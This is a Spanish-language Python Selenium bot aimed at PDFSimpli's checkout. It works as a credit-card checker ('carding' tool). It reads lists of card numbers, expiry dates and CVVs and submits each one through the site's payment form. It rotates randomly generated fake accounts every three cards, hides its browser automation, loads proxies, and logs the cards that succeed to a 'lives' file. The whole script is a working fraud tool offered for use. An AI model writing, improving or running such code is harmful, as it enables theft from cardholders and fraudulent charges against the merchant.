# bot_pdf_simpli_completo.py
import os
import time
import random
import json
import traceback
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementClickInterceptedException
from selenium.webdriver.firefox.service import Service

class BotPDFSimpli:
    def __init__(self):
        self.driver = None
        self.wait = None
        
        # CARPETA PRINCIPAL DEL BOT
        self.carpeta_bot = "/data/data/com.termux/files/home/bot"
        
        # Todos los archivos en la misma carpeta
        self.tarjetas_file = os.path.join(self.carpeta_bot, "tarjetas.txt")
        self.cuentas_file = os.path.join(self.carpeta_bot, "cuentas.json")
        self.lives_file = os.path.join(self.carpeta_bot, "lives.txt")
        self.proxies_file = os.path.join(self.carpeta_bot, "proxies.txt")
        
        # Ruta del geckodriver
        self.geckodriver_path = "/data/data/com.termux/files/usr/bin/geckodriver"
        
        # Control de cuentas
        self.cuentas = []
        self.cuenta_actual_index = 0
        self.max_tarjetas_por_cuenta = 3
        self.tarjetas_procesadas_en_cuenta_actual = 0
        
        # Sistema de proxies
        self.proxies = []
        self.proxy_actual = None
        self.ip_actual = None
        
        print("🤖 INICIANDO BOT PDF SIMPLI - VERSIÓN COMPLETA")
        print(f"📁 Carpeta del bot: {self.carpeta_bot}")
        
        # Verificar y crear directorio
        self.verificar_directorio()
        
        # Verificar archivos necesarios
        self.verificar_archivos()
        
        # Cargar datos
        self.cargar_proxies()
        self.cargar_o_generar_cuentas()
        
        print("✅ Bot inicializado correctamente")

    def verificar_directorio(self):
        """Verificar y crear el directorio del bot"""
        if not os.path.exists(self.carpeta_bot):
            print(f"📁 Creando directorio: {self.carpeta_bot}")
            os.makedirs(self.carpeta_bot, exist_ok=True)

    def verificar_archivos(self):
        """Verificar y crear archivos necesarios"""
        print("🔍 Verificando archivos...")
        
        # Archivo de tarjetas
        if not os.path.exists(self.tarjetas_file):
            print("📝 Creando archivo de tarjetas...")
            with open(self.tarjetas_file, 'w') as f:
                f.write("# Formato: numero|mes|año|cvv\n")
                f.write("4111111111111111|12|2025|123\n")
                f.write("5111111111111118|06|2024|456\n")
        
        # Archivo de cuentas
        if not os.path.exists(self.cuentas_file):
            print("📝 Creando archivo de cuentas...")
            self.generar_cuentas(20)
        
        # Archivo de lives
        if not os.path.exists(self.lives_file):
            with open(self.lives_file, 'w') as f:
                f.write("# Tarjetas válidas encontradas\n")
        
        # Archivo de proxies
        if not os.path.exists(self.proxies_file):
            with open(self.proxies_file, 'w') as f:
                f.write("# Formato: ip:puerto\n")
                f.write("# Ejemplo: 192.168.1.1:8080\n")

    def cargar_proxies(self):
        """Cargar lista de proxies desde archivo"""
        try:
            if os.path.exists(self.proxies_file):
                with open(self.proxies_file, 'r') as f:
                    for linea in f:
                        linea = linea.strip()
                        if linea and not linea.startswith('#'):
                            self.proxies.append(linea)
                print(f"✅ {len(self.proxies)} proxies cargados")
        except Exception as e:
            print(f"❌ Error cargando proxies: {e}")

    def generar_cuentas(self, cantidad):
        """Generar cuentas aleatorias"""
        print(f"👥 Generando {cantidad} cuentas...")
        
        nombres = ['juan', 'maria', 'carlos', 'ana', 'luis', 'laura', 'miguel', 'elena', 'jose', 'patricia']
        apellidos = ['garcia', 'rodriguez', 'gonzalez', 'lopez', 'martinez', 'perez', 'sanchez', 'ramirez']
        
        self.cuentas = []
        for i in range(cantidad):
            nombre = random.choice(nombres)
            apellido = random.choice(apellidos)
            numero = random.randint(1000, 9999)
            dominio = random.choice(['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com'])
            
            email = f"{nombre}.{apellido}{numero}@{dominio}"
            password = f"{nombre.capitalize()}{apellido.capitalize()}{random.randint(100, 999)}!"
            
            self.cuentas.append({
                "email": email,
                "password": password,
                "usada": False,
                "tarjetas_procesadas": 0,
                "fecha_creacion": time.strftime("%Y-%m-%d %H:%M:%S"),
                "ultimo_uso": None,
                "exitosas": 0,
                "fallidas": 0
            })
        
        self.guardar_cuentas()
        print(f"✅ {cantidad} cuentas generadas")

    def cargar_o_generar_cuentas(self):
        """Cargar cuentas desde archivo o generarlas si no existen"""
        try:
            if os.path.exists(self.cuentas_file):
                with open(self.cuentas_file, 'r') as f:
                    data = json.load(f)
                    self.cuentas = data
                print(f"✅ {len(self.cuentas)} cuentas cargadas")
            else:
                self.generar_cuentas(20)
        except Exception as e:
            print(f"❌ Error cargando cuentas: {e}")
            self.generar_cuentas(20)

    def guardar_cuentas(self):
        """Guardar cuentas en archivo"""
        try:
            with open(self.cuentas_file, 'w') as f:
                json.dump(self.cuentas, f, indent=2)
        except Exception as e:
            print(f"❌ Error guardando cuentas: {e}")

    def obtener_proxima_cuenta(self):
        """Obtener la siguiente cuenta disponible"""
        cuentas_disponibles = [c for c in self.cuentas if not c.get('usada', False) or c.get('tarjetas_procesadas', 0) < self.max_tarjetas_por_cuenta]
        
        if not cuentas_disponibles:
            print("🔄 No hay cuentas disponibles, generando nuevas...")
            self.generar_cuentas(10)
            cuentas_disponibles = [c for c in self.cuentas if not c.get('usada', False) or c.get('tarjetas_procesadas', 0) < self.max_tarjetas_por_cuenta]
        
        if not cuentas_disponibles:
            return None
        
        cuentas_no_usadas = [c for c in cuentas_disponibles if not c.get('usada', False)]
        if cuentas_no_usadas:
            cuenta = random.choice(cuentas_no_usadas)
        else:
            cuenta = random.choice(cuentas_disponibles)
        
        self.cuenta_actual_index = self.cuentas.index(cuenta)
        return cuenta

    def marcar_cuenta_usada(self, exito=True):
        """Marcar cuenta como usada y actualizar estadísticas"""
        if self.cuenta_actual_index < len(self.cuentas):
            cuenta = self.cuentas[self.cuenta_actual_index]
            cuenta['usada'] = True
            cuenta['ultimo_uso'] = time.strftime("%Y-%m-%d %H:%M:%S")
            
            if exito:
                cuenta['tarjetas_procesadas'] = cuenta.get('tarjetas_procesadas', 0) + 1
                cuenta['exitosas'] = cuenta.get('exitosas', 0) + 1
            else:
                cuenta['tarjetas_procesadas'] = cuenta.get('tarjetas_procesadas', 0) + 1
                cuenta['fallidas'] = cuenta.get('fallidas', 0) + 1
            
            self.guardar_cuentas()

    def configurar_navegador(self):
        """Configurar Firefox para Termux"""
        print("🔄 Configurando navegador...")
        try:
            options = Options()
            
            # Configuración para Firefox
            options.set_preference("dom.webdriver.enabled", False)
            options.set_preference('useAutomationExtension', False)
            options.set_preference("browser.privatebrowsing.autostart", True)
            options.set_preference("accept_insecure_certs", True)
            options.set_preference("dom.disable_beforeunload", True)
            
            # Configuración de descargas
            options.set_preference("browser.download.folderList", 2)
            options.set_preference("browser.download.dir", self.carpeta_bot)
            options.set_preference("browser.download.useDownloadDir", True)
            options.set_preference("browser.helperApps.neverAsk.saveToDisk", "application/pdf")
            options.set_preference("pdfjs.disabled", True)
            
            # Para Termux
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            
            service = Service(executable_path=self.geckodriver_path)
            self.driver = webdriver.Firefox(service=service, options=options)
            self.driver.set_page_load_timeout(30)
            self.wait = WebDriverWait(self.driver, 20)
            
            print("✅ Navegador configurado correctamente")
            return True
            
        except Exception as e:
            print(f"❌ Error configurando navegador: {e}")
            return False

    def encontrar_pdf(self):
        """Encontrar archivo PDF en la carpeta del bot"""
        print("🔍 Buscando archivo PDF...")
        try:
            for archivo in os.listdir(self.carpeta_bot):
                if archivo.lower().endswith('.pdf'):
                    pdf_path = os.path.join(self.carpeta_bot, archivo)
                    print(f"✅ PDF encontrado: {archivo}")
                    return pdf_path
            print("❌ No se encontró ningún archivo PDF")
            return None
        except Exception as e:
            print(f"❌ Error buscando PDF: {e}")
            return None

    def leer_tarjetas(self):
        """Leer tarjetas del archivo"""
        print("🔍 Leyendo tarjetas...")
        tarjetas = []
        try:
            with open(self.tarjetas_file, 'r') as f:
                for linea in f:
                    linea = linea.strip()
                    if linea and not linea.startswith('#'):
                        partes = linea.split('|')
                        if len(partes) == 4:
                            tarjetas.append({
                                'numero': partes[0].strip(),
                                'mes': partes[1].strip(),
                                'anio': partes[2].strip(),
                                'cvv': partes[3].strip()
                            })
            print(f"✅ {len(tarjetas)} tarjetas leídas")
            return tarjetas
        except Exception as e:
            print(f"❌ Error leyendo tarjetas: {e}")
            return []

    def subir_pdf(self, ruta_pdf):
        """Subir archivo PDF al sitio"""
        print("📤 Subiendo PDF...")
        try:
            # Ir al sitio web
            self.driver.get("https://pdfsimpli.com")
            time.sleep(3)
            
            # Buscar input de archivo
            file_inputs = self.driver.find_elements(By.CSS_SELECTOR, "input[type='file']")
            
            if file_inputs:
                file_inputs[0].send_keys(ruta_pdf)
                print("✅ PDF enviado al input")
                time.sleep(5)
                return True
            else:
                print("❌ No se encontró input para subir archivos")
                return False
                
        except Exception as e:
            print(f"❌ Error subiendo PDF: {e}")
            return False

    def hacer_clic_convert_continue(self):
        """Hacer clic en Convert/Continue"""
        try:
            selectores = [
                (By.ID, "ConvertContinue"),
                (By.XPATH, "//button[contains(text(), 'Convert')]"),
                (By.XPATH, "//button[contains(text(), 'Continue')]"),
            ]
            
            for selector in selectores:
                try:
                    elemento = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable(selector)
                    )
                    elemento.click()
                    time.sleep(3)
                    return True
                except:
                    continue
            return False
        except Exception as e:
            print(f"❌ Error en Convert/Continue: {e}")
            return False

    def hacer_clic_descarga(self):
        """Hacer clic en descarga"""
        try:
            elemento = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.ID, "congDwnaut"))
            )
            elemento.click()
            time.sleep(5)
            return True
        except:
            return False

    def manejar_registro(self, cuenta):
        """Manejar registro con cuenta específica"""
        try:
            time.sleep(2)
            
            # Completar email
            campo_email = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.ID, "email"))
            )
            campo_email.clear()
            campo_email.send_keys(cuenta['email'])
            time.sleep(1)
            
            # Completar password
            campo_password = self.driver.find_element(By.ID, "password")
            campo_password.clear()
            campo_password.send_keys(cuenta['password'])
            time.sleep(1)
            
            # Hacer clic en registro
            boton_registro = self.driver.find_element(By.ID, "sign-up")
            boton_registro.click()
            time.sleep(5)
            
            # Manejar CAPTCHA manualmente
            print("⏳ Esperando resolución manual de CAPTCHA...")
            input("🔍 Resuelve el CAPTCHA manualmente y presiona ENTER para continuar...")
            time.sleep(3)
            
            return True
            
        except Exception as e:
            print(f"❌ Error en registro: {e}")
            return False

    def buscar_y_completar_campo_tarjeta(self, tarjeta_actual):
        """Buscar y completar campo de tarjeta"""
        try:
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            if len(iframes) > 1:
                self.driver.switch_to.frame(iframes[1])
                
                campo = WebDriverWait(self.driver, 5).until(
                    EC.presence_of_element_located((By.ID, "data"))
                )
                campo.click()
                campo.clear()
                campo.send_keys(tarjeta_actual['numero'])
                self.driver.switch_to.default_content()
                return True
                
        except:
            self.driver.switch_to.default_content()
        
        return False

    def buscar_y_completar_cvv(self, tarjeta_actual):
        """Buscar y completar CVV"""
        try:
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            if len(iframes) > 6:
                self.driver.switch_to.frame(iframes[6])
                
                campo = WebDriverWait(self.driver, 5).until(
                    EC.presence_of_element_located((By.ID, "data"))
                )
                campo.click()
                campo.clear()
                campo.send_keys(tarjeta_actual['cvv'])
                self.driver.switch_to.default_content()
                return True
                
        except:
            self.driver.switch_to.default_content()
        
        return False

    def generar_nombre_aleatorio(self):
        """Generar nombre aleatorio"""
        nombres = ["Juan", "Maria", "Carlos", "Ana", "Luis", "Laura"]
        apellidos = ["Garcia", "Rodriguez", "Gonzalez", "Lopez", "Martinez"]
        return f"{random.choice(nombres)} {random.choice(apellidos)}"

    def buscar_y_completar_nombre(self):
        """Buscar y completar campo de nombre"""
        try:
            nombre = self.generar_nombre_aleatorio()
            campo = WebDriverWait(self.driver, 5).until(
                EC.presence_of_element_located((By.ID, "checkout_form_card_name"))
            )
            campo.clear()
            campo.send_keys(nombre)
            return True
        except:
            return False

    def buscar_y_completar_fecha(self, tarjeta_actual):
        """Buscar y completar fecha de expiración"""
        try:
            # Mes
            select_mes = WebDriverWait(self.driver, 5).until(
                EC.presence_of_element_located((By.NAME, "ccMonthExp"))
            )
            Select(select_mes).select_by_value(str(int(tarjeta_actual['mes'])))
            
            # Año
            select_anio = self.driver.find_element(By.NAME, "ccYearExp")
            anio_valor = tarjeta_actual['anio']
            if len(anio_valor) == 2:
                anio_valor = "20" + anio_valor
            Select(select_anio).select_by_value(anio_valor)
            
            return True
        except:
            return False

    def marcar_checkbox_terminos(self):
        """Marcar checkbox de términos"""
        try:
            checkbox = WebDriverWait(self.driver, 5).until(
                EC.element_to_be_clickable((By.ID, "acceptCheckboxMark"))
            )
            checkbox.click()
            time.sleep(1)
            return True
        except:
            return False

    def hacer_clic_boton_obtener_documento(self):
        """Hacer clic en botón Obtener Documento"""
        try:
            boton = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.ID, "btnChargeebeeSubmit"))
            )
            boton.click()
            time.sleep(5)
            return True
        except:
            return False

    def verificar_resultado_tarjeta(self, tarjeta_actual=None):
        """Verificar resultado de la tarjeta"""
        print("🔍 Verificando resultado...")
        try:
            time.sleep(10)
            
            # Verificar por URL
            current_url = self.driver.current_url
            if "pdfsimpli.com/app/billing/confirmation" in current_url:
                print("✅ ✅ ✅ PAGO EXITOSO - Tarjeta VÁLIDA")
                if tarjeta_actual:
                    self.guardar_tarjeta_valida(tarjeta_actual)
                return True
            
            # Verificar por elementos de éxito
            page_source = self.driver.page_source.lower()
            if any(term in page_source for term in ['payment successful', 'pago exitoso', 'thank you']):
                print("✅ ✅ ✅ PAGO EXITOSO - Tarjeta VÁLIDA")
                if tarjeta_actual:
                    self.guardar_tarjeta_valida(tarjeta_actual)
                return True
            
            # Verificar botón Close (tarjeta inválida)
            try:
                boton_close = WebDriverWait(self.driver, 5).until(
                    EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Close')]"))
                )
                if boton_close:
                    print("❌ Tarjeta INVÁLIDA - Botón Close detectado")
                    boton_close.click()
                    time.sleep(2)
                    return False
            except:
                pass
            
            print("❌ No se detectó confirmación - Tarjeta probablemente INVÁLIDA")
            return False
            
        except Exception as e:
            print(f"❌ Error verificando resultado: {e}")
            return False

    def guardar_tarjeta_valida(self, tarjeta):
        """Guardar tarjeta válida en archivo"""
        try:
            with open(self.lives_file, "a") as f:
                linea = f"{tarjeta['numero']}|{tarjeta['mes']}|{tarjeta['anio']}|{tarjeta['cvv']}\n"
                f.write(linea)
            print(f"💾 Tarjeta válida guardada: {tarjeta['numero']}")
            return True
        except Exception as e:
            print(f"❌ Error guardando tarjeta válida: {e}")
            return False

    def eliminar_tarjeta_del_archivo(self, tarjeta):
        """Eliminar tarjeta procesada del archivo"""
        try:
            with open(self.tarjetas_file, 'r') as f:
                lineas = f.readlines()
            
            nueva_lineas = []
            tarjeta_str = f"{tarjeta['numero']}|{tarjeta['mes']}|{tarjeta['anio']}|{tarjeta['cvv']}"
            encontrada = False
            
            for linea in lineas:
                if linea.strip() == tarjeta_str and not encontrada:
                    encontrada = True
                    continue
                nueva_lineas.append(linea)
            
            if encontrada:
                with open(self.tarjetas_file, 'w') as f:
                    f.writelines(nueva_lineas)
                print(f"🗑️ Tarjeta eliminada del archivo: {tarjeta['numero'][:8]}...")
            
        except Exception as e:
            print(f"❌ Error eliminando tarjeta: {e}")

    def proceso_con_tarjeta_completo(self, tarjeta_actual, numero_iteracion):
        """Proceso completo con tarjeta"""
        try:
            print(f"\n💳 Procesando tarjeta {numero_iteracion}: {tarjeta_actual['numero']}")
            
            # Completar todos los campos
            self.buscar_y_completar_nombre()
            self.buscar_y_completar_fecha(tarjeta_actual)
            self.buscar_y_completar_campo_tarjeta(tarjeta_actual)
            self.buscar_y_completar_cvv(tarjeta_actual)
            self.marcar_checkbox_terminos()
            
            # Hacer clic en el botón
            if self.hacer_clic_boton_obtener_documento():
                return self.verificar_resultado_tarjeta(tarjeta_actual)
            
            return False
            
        except Exception as e:
            print(f"❌ Error en proceso de tarjeta: {e}")
            return False

    def ejecutar_flujo_completo(self, tarjeta, numero_tarjeta, cuenta):
        """Ejecutar flujo completo para primera tarjeta"""
        try:
            print(f"\n🚀 INICIANDO FLUJO COMPLETO - Tarjeta {numero_tarjeta}")
            
            # Encontrar PDF
            ruta_pdf = self.encontrar_pdf()
            if not ruta_pdf:
                return False
            
            # Paso 1: Subir PDF
            if not self.subir_pdf(ruta_pdf):
                return False
            
            # Paso 2: Convertir
            if not self.hacer_clic_convert_continue():
                return False
            
            # Paso 3: Descarga
            if not self.hacer_clic_descarga():
                return False
            
            # Paso 4: Registro
            if not self.manejar_registro(cuenta):
                return False
            
            # Paso 5: Procesar tarjeta
            if self.proceso_con_tarjeta_completo(tarjeta, numero_tarjeta):
                return True
            else:
                return False
                
        except Exception as e:
            print(f"❌ Error en flujo completo: {e}")
            return False

    def ejecutar_proceso_completo(self):
        """Ejecutar proceso completo del bot"""
        print("\n" + "="*60)
        print("🎯 INICIANDO PROCESO COMPLETO DEL BOT")
        print("="*60)
        
        try:
            # Cargar tarjetas
            tarjetas = self.leer_tarjetas()
            if not tarjetas:
                print("❌ No hay tarjetas para procesar")
                return
            
            print(f"📊 Total de tarjetas: {len(tarjetas)}")
            
            # Configurar navegador
            if not self.configurar_navegador():
                return
            
            # Obtener primera cuenta
            cuenta_actual = self.obtener_proxima_cuenta()
            if not cuenta_actual:
                print("❌ No hay cuentas disponibles")
                return
            
            tarjetas_validas = 0
            tarjetas_procesadas = 0
            
            for i, tarjeta in enumerate(tarjetas, 1):
                print(f"\n" + "─" * 50)
                print(f"🔰 PROCESANDO TARJETA {i}/{len(tarjetas)}")
                print("─" * 50)
                
                # Cambiar cuenta si es necesario
                if cuenta_actual.get('tarjetas_procesadas', 0) >= self.max_tarjetas_por_cuenta:
                    print("🔄 Cambiando cuenta...")
                    cuenta_actual = self.obtener_proxima_cuenta()
                    if not cuenta_actual:
                        print("❌ No hay más cuentas disponibles")
                        break
                
                # Ejecutar flujo
                if cuenta_actual.get('tarjetas_procesadas', 0) == 0:
                    exito = self.ejecutar_flujo_completo(tarjeta, i, cuenta_actual)
                else:
                    # Para tarjetas posteriores, solo procesar la tarjeta
                    exito = self.proceso_con_tarjeta_completo(tarjeta, i)
                
                # Actualizar estadísticas
                self.eliminar_tarjeta_del_archivo(tarjeta)
                
                if exito:
                    self.marcar_cuenta_usada(exito=True)
                    tarjetas_validas += 1
                    tarjetas_procesadas += 1
                    print(f"🎉 TARJETA VÁLIDA: {tarjeta['numero']}")
                else:
                    self.marcar_cuenta_usada(exito=False)
                    tarjetas_procesadas += 1
                    print(f"❌ TARJETA INVÁLIDA: {tarjeta['numero']}")
                
                # Espera entre tarjetas
                if i < len(tarjetas):
                    time.sleep(2)
            
            # Resultados finales
            print(f"\n" + "="*60)
            print("📊 RESULTADOS FINALES")
            print("="*60)
            print(f"✅ Tarjetas válidas: {tarjetas_validas}")
            print(f"📊 Total procesadas: {tarjetas_procesadas}")
            print(f"🎯 Efectividad: {(tarjetas_validas/tarjetas_procesadas*100) if tarjetas_procesadas > 0 else 0:.1f}%")
            print(f"💾 Tarjetas válidas guardadas en: {self.lives_file}")
                
        except Exception as e:
            print(f"💥 ERROR CRÍTICO: {e}")
            traceback.print_exc()
        finally:
            if self.driver:
                print("🔄 Cerrando navegador...")
                self.driver.quit()

    def mostrar_estado(self):
        """Mostrar estado del sistema"""
        print(f"\n📊 ESTADO DEL SISTEMA")
        print(f"📁 Carpeta: {self.carpeta_bot}")
        
        # Verificar archivos
        archivos = os.listdir(self.carpeta_bot)
        pdfs = [f for f in archivos if f.endswith('.pdf')]
        
        print(f"📄 PDFs encontrados: {len(pdfs)}")
        for pdf in pdfs:
            print(f"   📄 {pdf}")
        
        # Estadísticas
        tarjetas = self.leer_tarjetas()
        print(f"💳 Tarjetas por procesar: {len(tarjetas)}")
        print(f"👥 Cuentas disponibles: {len(self.cuentas)}")
        print(f"🔌 Proxies cargados: {len(self.proxies)}")

    def probar_subida_pdf(self):
        """Probar solo la subida del PDF"""
        print("\n🧪 PROBANDO SUBIDA DE PDF")
        
        if not self.configurar_navegador():
            return False
        
        pdf_path = self.encontrar_pdf()
        if not pdf_path:
            self.driver.quit()
            return False
        
        resultado = self.subir_pdf(pdf_path)
        
        if resultado:
            print("✅ Prueba exitosa")
            input("Presiona ENTER para cerrar...")
        else:
            print("❌ Prueba fallida")
        
        self.driver.quit()
        return resultado

def main():
    """Función principal"""
    bot = BotPDFSimpli()
    
    while True:
        print("\n" + "="*50)
        print("🤖 BOT PDF SIMPLI - MENÚ PRINCIPAL")
        print("="*50)
        print("1. 🎯 Ejecutar proceso completo")
        print("2. 🧪 Probar subida de PDF")
        print("3. 📊 Mostrar estado del sistema")
        print("4. 👥 Ver cuentas disponibles")
        print("5. 💳 Ver tarjetas cargadas")
        print("6. 🚪 Salir")
        print("="*50)
        
        opcion = input("Selecciona una opción: ").strip()
        
        if opcion == "1":
            bot.ejecutar_proceso_completo()
        elif opcion == "2":
            bot.probar_subida_pdf()
        elif opcion == "3":
            bot.mostrar_estado()
        elif opcion == "4":
            print(f"\n👥 Cuentas disponibles: {len(bot.cuentas)}")
            for i, cuenta in enumerate(bot.cuentas[:10]):
                estado = "🆕 Nueva" if not cuenta['usada'] else f"📊 Usada ({cuenta['tarjetas_procesadas']})"
                print(f"   {i+1}. {cuenta['email']} - {estado}")
        elif opcion == "5":
            tarjetas = bot.leer_tarjetas()
            print(f"\n💳 Tarjetas cargadas: {len(tarjetas)}")
            for i, tarjeta in enumerate(tarjetas[:10]):
                print(f"   {i+1}. {tarjeta['numero']} | {tarjeta['mes']}/{tarjeta['anio']} | CVV: {tarjeta['cvv']}")
        elif opcion == "6":
            print("👋 ¡Hasta pronto!")
            break
        else:
            print("❌ Opción no válida")

if __name__ == "__main__":
    main()